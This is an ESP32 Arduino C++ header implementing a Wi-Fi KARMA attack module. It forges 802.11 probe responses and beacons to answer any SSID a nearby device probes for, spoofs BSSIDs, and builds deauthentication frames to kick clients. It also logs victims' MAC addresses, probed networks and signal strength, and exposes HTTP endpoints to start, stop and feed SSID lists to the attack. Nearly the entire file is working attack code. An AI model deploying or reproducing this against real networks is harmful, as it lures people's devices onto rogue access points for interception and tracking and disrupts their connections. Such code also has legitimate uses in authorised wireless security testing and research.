#pragma once
#include <Arduino.h>
#include <WebServer.h>
#include <string.h>
#include <stdint.h>
#include "esp_wifi.h"

// ── KARMA Attack Module ───────────────────────────────────────────────────────
// KARMA: respond to any client probe request with a matching beacon + assoc
// response, luring clients to associate with our AP.
// Prefix: "ka_"
// ─────────────────────────────────────────────────────────────────────────────

extern WebServer server;

#define KA_MAX_SSID_POOL    64
#define KA_MAX_LOG          128
#define KA_MAX_CLIENTS      32
#define KA_SSID_MAX_LEN     32

// ── State enums ───────────────────────────────────────────────────────────────
enum KaMode : uint8_t {
  KA_MODE_OFF      = 0,
  KA_MODE_KARMA    = 1,  // respond to any probe
  KA_MODE_WHITELIST= 2,  // only respond to known SSIDs in pool
  KA_MODE_BEACON   = 3,  // broadcast all pool SSIDs as beacons
};

enum KaClientState : uint8_t {
  KA_CS_PROBING   = 0,
  KA_CS_ASSOC_REQ = 1,
  KA_CS_ASSOC_OK  = 2,
  KA_CS_ACTIVE    = 3,
  KA_CS_GONE      = 4,
};

// ── SSID pool entry ───────────────────────────────────────────────────────────
struct KaSsidEntry {
  char     ssid[KA_SSID_MAX_LEN+1];
  bool     active;
  uint32_t responses;
  uint32_t associations;
  uint8_t  channel;
};

// ── KARMA client record ───────────────────────────────────────────────────────
struct KaClient {
  uint8_t       mac[6];
  char          ssid[KA_SSID_MAX_LEN+1];
  KaClientState state;
  uint32_t      first_seen_ms;
  uint32_t      last_seen_ms;
  int8_t        rssi;
  uint16_t      probe_count;
};

// ── Log entry ─────────────────────────────────────────────────────────────────
struct KaLogEntry {
  uint32_t ts_ms;
  uint8_t  mac[6];
  char     ssid[KA_SSID_MAX_LEN+1];
  uint8_t  event;   // 0=probe, 1=resp, 2=assoc, 3=disassoc
};

// ── KARMA state ───────────────────────────────────────────────────────────────
struct KaState {
  KaMode      mode;
  bool        running;
  bool        spoof_bssid;
  uint8_t     base_mac[6];
  uint8_t     channel;
  KaSsidEntry ssid_pool[KA_MAX_SSID_POOL];
  uint8_t     pool_count;
  KaClient    clients[KA_MAX_CLIENTS];
  uint8_t     client_count;
  KaLogEntry  log[KA_MAX_LOG];
  uint8_t     log_head;
  uint16_t    log_count;
  uint32_t    total_probes;
  uint32_t    total_responses;
  uint32_t    total_assocs;
};

static KaState g_ka = {};

// ── Helpers ───────────────────────────────────────────────────────────────────
static void ka_mac_str(const uint8_t* m, char* out) {
  snprintf(out,18,"%02X:%02X:%02X:%02X:%02X:%02X",m[0],m[1],m[2],m[3],m[4],m[5]);
}

static bool ka_mac_eq(const uint8_t* a, const uint8_t* b) {
  return memcmp(a,b,6)==0;
}

static void ka_log(uint8_t* mac, const char* ssid, uint8_t event) {
  KaLogEntry* e = &g_ka.log[g_ka.log_head];
  e->ts_ms = millis();
  memcpy(e->mac, mac, 6);
  strncpy(e->ssid, ssid ? ssid : "", KA_SSID_MAX_LEN);
  e->event = event;
  g_ka.log_head = (g_ka.log_head + 1) % KA_MAX_LOG;
  if(g_ka.log_count < KA_MAX_LOG) g_ka.log_count++;
}

// ── SSID pool management ──────────────────────────────────────────────────────
static bool ka_add_ssid(const char* ssid) {
  if(!ssid || strlen(ssid)==0 || strlen(ssid)>KA_SSID_MAX_LEN) return false;
  // Check duplicate
  for(uint8_t i=0;i<g_ka.pool_count;i++){
    if(strcmp(g_ka.ssid_pool[i].ssid, ssid)==0) return false;
  }
  if(g_ka.pool_count >= KA_MAX_SSID_POOL) return false;
  KaSsidEntry* e = &g_ka.ssid_pool[g_ka.pool_count++];
  strncpy(e->ssid, ssid, KA_SSID_MAX_LEN);
  e->ssid[KA_SSID_MAX_LEN] = 0;
  e->active = true;
  e->responses = 0;
  e->associations = 0;
  e->channel = 6;
  return true;
}

static void ka_remove_ssid(const char* ssid) {
  for(uint8_t i=0;i<g_ka.pool_count;i++){
    if(strcmp(g_ka.ssid_pool[i].ssid, ssid)==0){
      memmove(&g_ka.ssid_pool[i], &g_ka.ssid_pool[i+1],
              (g_ka.pool_count-i-1)*sizeof(KaSsidEntry));
      g_ka.pool_count--;
      return;
    }
  }
}

static KaSsidEntry* ka_find_ssid(const char* ssid) {
  for(uint8_t i=0;i<g_ka.pool_count;i++){
    if(strcmp(g_ka.ssid_pool[i].ssid, ssid)==0 && g_ka.ssid_pool[i].active)
      return &g_ka.ssid_pool[i];
  }
  return nullptr;
}

// ── Client management ─────────────────────────────────────────────────────────
static KaClient* ka_upsert_client(const uint8_t* mac) {
  for(uint8_t i=0;i<g_ka.client_count;i++){
    if(ka_mac_eq(g_ka.clients[i].mac, mac)){
      g_ka.clients[i].last_seen_ms = millis();
      return &g_ka.clients[i];
    }
  }
  if(g_ka.client_count >= KA_MAX_CLIENTS){
    // Evict oldest gone/idle client
    uint32_t oldest_ts = UINT32_MAX;
    uint8_t oldest_i = 0;
    for(uint8_t i=0;i<KA_MAX_CLIENTS;i++){
      if(g_ka.clients[i].state==KA_CS_GONE && g_ka.clients[i].last_seen_ms < oldest_ts){
        oldest_ts = g_ka.clients[i].last_seen_ms;
        oldest_i = i;
      }
    }
    memset(&g_ka.clients[oldest_i], 0, sizeof(KaClient));
    KaClient* c = &g_ka.clients[oldest_i];
    memcpy(c->mac, mac, 6);
    c->first_seen_ms = millis();
    c->last_seen_ms = millis();
    c->state = KA_CS_PROBING;
    return c;
  }
  KaClient* c = &g_ka.clients[g_ka.client_count++];
  memset(c, 0, sizeof(KaClient));
  memcpy(c->mac, mac, 6);
  c->first_seen_ms = millis();
  c->last_seen_ms = millis();
  c->state = KA_CS_PROBING;
  return c;
}

// ── Probe response frame builder ──────────────────────────────────────────────
// 802.11 probe response frame, 24-byte MAC header + fixed fields + IEs
static int ka_build_probe_resp(uint8_t* buf, int buflen,
                                const uint8_t* dst, const uint8_t* bssid,
                                const char* ssid, uint8_t channel) {
  if(!buf || buflen < 64) return -1;
  int pos = 0;

  // Radiotap header (8 bytes minimal)
  buf[pos++] = 0x00; // version
  buf[pos++] = 0x00; // pad
  buf[pos++] = 0x08; // length lo
  buf[pos++] = 0x00; // length hi
  buf[pos++] = 0x00; buf[pos++] = 0x00; buf[pos++] = 0x00; buf[pos++] = 0x00; // present

  // 802.11 MAC header (24 bytes)
  buf[pos++] = 0x50; buf[pos++] = 0x00; // frame control: probe response
  buf[pos++] = 0x00; buf[pos++] = 0x00; // duration
  memcpy(buf+pos, dst,   6); pos+=6;    // DA
  memcpy(buf+pos, bssid, 6); pos+=6;    // SA (us)
  memcpy(buf+pos, bssid, 6); pos+=6;    // BSSID
  buf[pos++] = 0x00; buf[pos++] = 0x00; // seq ctrl

  // Fixed fields (12 bytes)
  uint64_t ts = (uint64_t)millis() * 1000ULL;
  memcpy(buf+pos, &ts, 8); pos+=8;      // timestamp
  buf[pos++] = 0x64; buf[pos++] = 0x00; // beacon interval 100 TU
  buf[pos++] = 0x11; buf[pos++] = 0x00; // capability: ESS

  // IE: SSID
  uint8_t ssid_len = (uint8_t)strlen(ssid);
  buf[pos++] = 0x00;
  buf[pos++] = ssid_len;
  memcpy(buf+pos, ssid, ssid_len); pos+=ssid_len;

  // IE: Supported Rates (1,2,5.5,11,6,9,12,18 Mbps)
  buf[pos++] = 0x01; buf[pos++] = 0x08;
  buf[pos++] = 0x82; buf[pos++] = 0x84; buf[pos++] = 0x8b; buf[pos++] = 0x96;
  buf[pos++] = 0x0c; buf[pos++] = 0x12; buf[pos++] = 0x18; buf[pos++] = 0x24;

  // IE: DS Parameter Set (channel)
  buf[pos++] = 0x03; buf[pos++] = 0x01; buf[pos++] = channel;

  if(pos > buflen) return -1;
  return pos;
}

// ── Beacon frame builder ──────────────────────────────────────────────────────
static int ka_build_beacon(uint8_t* buf, int buflen,
                            const uint8_t* bssid, const char* ssid, uint8_t channel) {
  if(!buf || buflen < 80) return -1;
  int pos = 0;
  static const uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

  // Radiotap
  buf[pos++]=0x00; buf[pos++]=0x00; buf[pos++]=0x08; buf[pos++]=0x00;
  buf[pos++]=0x00; buf[pos++]=0x00; buf[pos++]=0x00; buf[pos++]=0x00;

  // MAC header: beacon
  buf[pos++]=0x80; buf[pos++]=0x00; // frame ctrl: beacon
  buf[pos++]=0x00; buf[pos++]=0x00; // duration
  memcpy(buf+pos, broadcast, 6); pos+=6; // DA = broadcast
  memcpy(buf+pos, bssid, 6);     pos+=6;
  memcpy(buf+pos, bssid, 6);     pos+=6;
  buf[pos++]=0x00; buf[pos++]=0x00;

  // Fixed fields
  uint64_t ts=(uint64_t)millis()*1000ULL;
  memcpy(buf+pos,&ts,8); pos+=8;
  buf[pos++]=0x64; buf[pos++]=0x00; // interval
  buf[pos++]=0x11; buf[pos++]=0x00; // capability

  // IEs
  uint8_t slen=(uint8_t)strlen(ssid);
  buf[pos++]=0x00; buf[pos++]=slen;
  memcpy(buf+pos,ssid,slen); pos+=slen;

  buf[pos++]=0x01; buf[pos++]=0x08;
  buf[pos++]=0x82;buf[pos++]=0x84;buf[pos++]=0x8b;buf[pos++]=0x96;
  buf[pos++]=0x0c;buf[pos++]=0x12;buf[pos++]=0x18;buf[pos++]=0x24;

  buf[pos++]=0x03; buf[pos++]=0x01; buf[pos++]=channel;

  buf[pos++]=0x05; buf[pos++]=0x04; // TIM IE
  buf[pos++]=0x00; buf[pos++]=0x01; buf[pos++]=0x00; buf[pos++]=0x00;

  if(pos > buflen) return -1;
  return pos;
}

// ── Deauth frame builder (to kick clients that partially associate) ────────────
static int ka_build_deauth(uint8_t* buf, int buflen,
                            const uint8_t* dst, const uint8_t* bssid, uint16_t reason) {
  if(!buf || buflen < 32) return -1;
  int pos = 0;
  buf[pos++]=0x00;buf[pos++]=0x00;buf[pos++]=0x08;buf[pos++]=0x00;
  buf[pos++]=0x00;buf[pos++]=0x00;buf[pos++]=0x00;buf[pos++]=0x00;
  buf[pos++]=0xC0; buf[pos++]=0x00; // deauth
  buf[pos++]=0x00; buf[pos++]=0x00;
  memcpy(buf+pos,dst,6);   pos+=6;
  memcpy(buf+pos,bssid,6); pos+=6;
  memcpy(buf+pos,bssid,6); pos+=6;
  buf[pos++]=0x00; buf[pos++]=0x00;
  buf[pos++]=(uint8_t)(reason&0xFF);
  buf[pos++]=(uint8_t)(reason>>8);
  return pos;
}

// ── Promiscuous callback (called from rf_monitor or main prom handler) ────────
static void ka_on_probe(const uint8_t* src_mac, const char* ssid,
                         uint8_t channel, int8_t rssi) {
  if(!g_ka.running) return;
  if(!src_mac) return;

  g_ka.total_probes++;

  // Decide whether to respond
  bool should_respond = false;
  const char* resp_ssid = ssid;

  if(g_ka.mode == KA_MODE_KARMA) {
    // Respond to any probe with a non-empty SSID
    if(ssid && strlen(ssid) > 0) should_respond = true;
  } else if(g_ka.mode == KA_MODE_WHITELIST) {
    if(ssid && ka_find_ssid(ssid)) should_respond = true;
  } else if(g_ka.mode == KA_MODE_BEACON) {
    // In beacon mode, we don't respond to probes directly
    should_respond = false;
  }

  if(!should_respond) return;

  // Log probe
  KaClient* cli = ka_upsert_client(src_mac);
  if(cli) {
    strncpy(cli->ssid, ssid, KA_SSID_MAX_LEN);
    cli->probe_count++;
    cli->rssi = rssi;
  }

  uint8_t* const_mac = (uint8_t*)src_mac;
  ka_log(const_mac, ssid, 0); // probe event

  // Build and send probe response
  uint8_t pkt[256];
  uint8_t my_bssid[6];
  memcpy(my_bssid, g_ka.base_mac, 6);
  if(g_ka.spoof_bssid) {
    // Generate BSSID from SSID hash
    uint32_t h = 5381;
    for(int i=0;ssid[i];i++) h=((h<<5)+h)^(uint8_t)ssid[i];
    my_bssid[3] ^= (h >> 16) & 0xFF;
    my_bssid[4] ^= (h >> 8)  & 0xFF;
    my_bssid[5] ^= (h)       & 0xFF;
    my_bssid[0] |= 0x02; // locally administered
  }

  int pktlen = ka_build_probe_resp(pkt, sizeof(pkt), src_mac, my_bssid, ssid, channel);
  if(pktlen > 0) {
    esp_wifi_80211_tx(WIFI_IF_AP, pkt, pktlen, false);
    g_ka.total_responses++;
    uint8_t* mut_mac = (uint8_t*)src_mac;
    ka_log(mut_mac, ssid, 1); // response event

    // Track in SSID pool if whitelist mode
    if(g_ka.mode == KA_MODE_WHITELIST) {
      KaSsidEntry* se = ka_find_ssid(ssid);
      if(se) se->responses++;
    }
  }
}

// ── Beacon broadcast tick ─────────────────────────────────────────────────────
static void ka_beacon_tick() {
  if(!g_ka.running || g_ka.mode != KA_MODE_BEACON) return;
  uint8_t pkt[256];
  for(uint8_t i=0;i<g_ka.pool_count;i++){
    if(!g_ka.ssid_pool[i].active) continue;
    uint8_t bssid[6];
    memcpy(bssid, g_ka.base_mac, 6);
    bssid[5] ^= i; // slightly differ BSSID per SSID
    bssid[0] |= 0x02;
    int plen = ka_build_beacon(pkt, sizeof(pkt),
                                bssid, g_ka.ssid_pool[i].ssid,
                                g_ka.channel);
    if(plen > 0) {
      esp_wifi_80211_tx(WIFI_IF_AP, pkt, plen, false);
      g_ka.ssid_pool[i].responses++;
    }
  }
}

// ── Start / stop ──────────────────────────────────────────────────────────────
static void ka_start(KaMode mode, uint8_t channel) {
  memset(&g_ka, 0, sizeof(KaState));
  g_ka.mode    = mode;
  g_ka.channel = channel;
  g_ka.running = true;
  // Grab AP MAC
  uint8_t mac[6];
  WiFi.softAPmacAddress(mac);
  memcpy(g_ka.base_mac, mac, 6);
  g_ka.base_mac[0] |= 0x02; // locally administered
}

static void ka_stop() {
  g_ka.running = false;
}

// ── JSON helpers ──────────────────────────────────────────────────────────────
static String ka_status_json() {
  String j = "{";
  const char* modes[] = {"off","karma","whitelist","beacon"};
  j += "\"mode\":\""; j += modes[g_ka.mode]; j += "\"";
  j += ",\"running\":"; j += g_ka.running ? 1 : 0;
  j += ",\"channel\":"; j += g_ka.channel;
  j += ",\"pool_count\":"; j += g_ka.pool_count;
  j += ",\"client_count\":"; j += g_ka.client_count;
  j += ",\"total_probes\":"; j += g_ka.total_probes;
  j += ",\"total_responses\":"; j += g_ka.total_responses;
  j += ",\"total_assocs\":"; j += g_ka.total_assocs;
  j += "}";
  return j;
}

static String ka_pool_json() {
  String j = "{\"count\":"; j += g_ka.pool_count; j += ",\"ssids\":[";
  for(uint8_t i=0;i<g_ka.pool_count;i++){
    if(i) j+=",";
    j+="{\"ssid\":\""; j+=g_ka.ssid_pool[i].ssid; j+="\"";
    j+=",\"active\":"; j+=g_ka.ssid_pool[i].active?1:0;
    j+=",\"responses\":"; j+=g_ka.ssid_pool[i].responses;
    j+=",\"assocs\":"; j+=g_ka.ssid_pool[i].associations;
    j+="}";
  }
  j+="]}";
  return j;
}

static String ka_clients_json() {
  String j="{\"count\":"; j+=g_ka.client_count; j+=",\"clients\":[";
  const char* cstates[]={"probing","assoc_req","assoc_ok","active","gone"};
  char mac_str[18];
  for(uint8_t i=0;i<g_ka.client_count;i++){
    if(i) j+=",";
    KaClient& c=g_ka.clients[i];
    ka_mac_str(c.mac,mac_str);
    j+="{\"mac\":\""; j+=mac_str; j+="\"";
    j+=",\"ssid\":\""; j+=c.ssid; j+="\"";
    j+=",\"state\":\""; j+=cstates[c.state]; j+="\"";
    j+=",\"rssi\":"; j+=c.rssi;
    j+=",\"probes\":"; j+=c.probe_count;
    j+=",\"age_ms\":"; j+=(uint32_t)(millis()-c.first_seen_ms);
    j+="}";
  }
  j+="]}";
  return j;
}

static String ka_log_json(int max_n) {
  if(max_n<1||max_n>KA_MAX_LOG) max_n=KA_MAX_LOG;
  String j="{\"count\":"; j+=g_ka.log_count; j+=",\"entries\":[";
  const char* evnames[]={"probe","resp","assoc","disassoc"};
  char mac_str[18];
  int start=(g_ka.log_head+KA_MAX_LOG-g_ka.log_count)%KA_MAX_LOG;
  for(int i=g_ka.log_count-1;i>=0&&i>=g_ka.log_count-max_n;i--){
    if(i<g_ka.log_count-1) j+=",";
    int idx=(start+i)%KA_MAX_LOG;
    KaLogEntry& e=g_ka.log[idx];
    ka_mac_str(e.mac,mac_str);
    j+="{\"ts\":"; j+=e.ts_ms;
    j+=",\"mac\":\""; j+=mac_str; j+="\"";
    j+=",\"ssid\":\""; j+=e.ssid; j+="\"";
    j+=",\"event\":\""; j+=(e.event<4?evnames[e.event]:"?"); j+="\"";
    j+="}";
  }
  j+="]}";
  return j;
}

// ── HTTP routes ───────────────────────────────────────────────────────────────
static void ka_routes() {
  server.on("/api/ka/status", HTTP_GET, [](){
    server.send(200, "application/json", ka_status_json());
  });

  server.on("/api/ka/start", HTTP_POST, [](){
    int mode_int = server.hasArg("mode") ? server.arg("mode").toInt() : 1;
    uint8_t ch   = server.hasArg("ch")   ? (uint8_t)server.arg("ch").toInt() : 6;
    if(mode_int < 0 || mode_int > 3){
      server.send(400,"application/json","{\"error\":\"invalid mode\"}"); return;
    }
    ka_start((KaMode)mode_int, ch);
    server.send(200,"application/json","{\"ok\":1}");
  });

  server.on("/api/ka/stop", HTTP_POST, [](){
    ka_stop();
    server.send(200,"application/json","{\"ok\":1}");
  });

  server.on("/api/ka/pool", HTTP_GET, [](){
    server.send(200,"application/json", ka_pool_json());
  });

  server.on("/api/ka/pool/add", HTTP_POST, [](){
    if(!server.hasArg("ssid")){
      server.send(400,"application/json","{\"error\":\"ssid required\"}"); return;
    }
    bool ok = ka_add_ssid(server.arg("ssid").c_str());
    server.send(200,"application/json", ok?"{\"ok\":1}":"{\"error\":\"pool full or duplicate\"}");
  });

  server.on("/api/ka/pool/remove", HTTP_POST, [](){
    if(!server.hasArg("ssid")){
      server.send(400,"application/json","{\"error\":\"ssid required\"}"); return;
    }
    ka_remove_ssid(server.arg("ssid").c_str());
    server.send(200,"application/json","{\"ok\":1}");
  });

  server.on("/api/ka/pool/clear", HTTP_POST, [](){
    g_ka.pool_count = 0;
    server.send(200,"application/json","{\"ok\":1}");
  });

  server.on("/api/ka/clients", HTTP_GET, [](){
    server.send(200,"application/json", ka_clients_json());
  });

  server.on("/api/ka/log", HTTP_GET, [](){
    int n = server.hasArg("n") ? server.arg("n").toInt() : 32;
    server.send(200,"application/json", ka_log_json(n));
  });

  server.on("/api/ka/clear", HTTP_POST, [](){
    ka_stop();
    memset(&g_ka, 0, sizeof(KaState));
    server.send(200,"application/json","{\"ok\":1}");
  });

  // Bulk-import SSID pool from newline-delimited body
  server.on("/api/ka/pool/import", HTTP_POST, [](){
    String body = server.arg("plain");
    if(body.length()==0){server.send(400,"application/json","{\"error\":\"empty body\"}");return;}
    int added=0,pos=0;
    while(pos<(int)body.length()){
      int nl=body.indexOf('\n',pos);
      if(nl<0) nl=body.length();
      String line=body.substring(pos,nl);
      line.trim();
      if(line.length()>0 && ka_add_ssid(line.c_str())) added++;
      pos=nl+1;
    }
    String resp="{\"added\":"+String(added)+",\"pool\":"+String(g_ka.pool_count)+"}";
    server.send(200,"application/json",resp);
  });

  // Trigger a manual beacon burst for all pool SSIDs
  server.on("/api/ka/beacon_burst", HTTP_POST, [](){
    int old_mode=g_ka.mode, was_running=g_ka.running;
    g_ka.mode=KA_MODE_BEACON; g_ka.running=true;
    ka_beacon_tick();
    g_ka.mode=(KaMode)old_mode; g_ka.running=was_running;
    server.send(200,"application/json","{\"ok\":1,\"ssids\":"+String(g_ka.pool_count)+"}");
  });
}
